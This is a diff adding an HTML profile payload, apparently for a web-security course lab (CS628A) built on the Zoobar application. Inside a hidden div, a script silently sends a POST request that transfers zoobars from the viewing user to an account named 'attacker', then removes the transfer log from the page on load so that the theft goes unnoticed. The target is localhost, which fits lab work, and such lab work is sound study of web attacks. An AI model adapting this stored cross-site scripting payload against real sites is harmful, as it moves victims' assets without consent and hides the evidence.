@@ -1,0 +1,21 @@
+<b> I Love CS628A! </b>
+<span id="zoobars" class="10"></span>
+<iframe width="0" height="0" id="iframe" style="visibility: hidden;" name="iframe"></iframe>
+<div style="visibility:hidden" id="div">
+	You Can't See Me!!
+	<script>
+		var transfer_zoobar = 1; //zoobars to be transfered
+
+		//transfer zoobars to attacker
+		var xhttp_transfer = new XMLHttpRequest();
+		xhttp_transfer.open('POST', 'http://localhost:8080/zoobar/index.cgi/transfer');
+		xhttp_transfer.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+    	xhttp_transfer.send('zoobars='+transfer_zoobar+'&recipient=attacker&submission=Send');
+
+
+
+    	//remove logs from transfer logs
+    	window.onload = function(){ document.getElementsByClassName("log")[0].getElementsByTagName("tbody")[0].remove();}
+	</script>
+
+</div>
